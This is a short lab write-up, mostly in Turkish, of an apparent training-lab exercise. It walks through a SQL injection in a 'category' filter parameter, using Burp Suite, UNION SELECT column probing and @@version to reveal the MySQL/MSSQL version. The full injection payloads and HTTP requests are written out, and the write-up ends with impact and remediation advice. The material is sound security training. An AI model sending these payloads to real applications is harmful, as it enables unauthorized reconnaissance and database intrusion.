# SQL injection attack, querying the database type and version on MySQL and Microsoft

## 1. Lab Bilgisi

**Difficulty:** Practitioner

## 2. Vulnerability Özeti

Bu labda `category` parametresi SQL sorgusuna güvenli şekilde eklenmediği için `UNION SELECT` ile enjekte edilen sorgunun sonucu sayfaya bastırılabiliyordu. Amaç, veritabanının MySQL veya Microsoft SQL Server olduğunu dikkate alarak versiyon bilgisini elde etmekti.

## 3. Exploitation Steps

1. Burp Suite ile kategori filtresini ayarlayan isteği yakaladım.
2. `category` parametresine tek tırnak ekleyerek SQL injection davranışını kontrol ettim.
3. `UNION SELECT` denemeleriyle sorgunun iki kolon döndürdüğünü doğruladım:

```sql
' UNION SELECT NULL,NULL#
```

4. MySQL ve Microsoft SQL Server tarafında versiyon bilgisini almak için `@@version` değerini kullandım.
5. İlk kolona versiyon bilgisini, ikinci kolona `NULL` yerleştirerek sonucu sayfada görüntülettim:

```sql
' UNION SELECT @@version,NULL#
```

6. Veritabanı versiyon string'i sayfada görününce lab tamamlandı.

## 4. Kullanılan Payloadlar

- Kolon sayısını doğrulamak için:

```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL# HTTP/2
```

- Veritabanı versiyon bilgisini göstermek için:

```http
GET /filter?category=Gifts' UNION SELECT @@version,NULL# HTTP/2
```

## 5. Sonuç

- Sorgunun iki kolon döndürdüğünü tespit ettim.
- `@@version` ile veritabanı versiyon bilgisini sayfaya bastırarak lab'ı tamamladım.

## 6. Etki

Bu zafiyet saldırganın veritabanı teknolojisini ve versiyonunu öğrenmesine neden olur. Bu bilgi, hedefe özel SQL injection payloadları hazırlamayı ve bilinen versiyon zafiyetlerini araştırmayı kolaylaştırır.

## 7. Çözüm

- SQL sorgularında parametreli/prepared statement kullan.
- Kullanıcı girdilerini doğrula ve SQL sorgusuna doğrudan ekleme.
- Uygulama cevaplarında teknik veritabanı bilgilerini göstermemeye dikkat et.
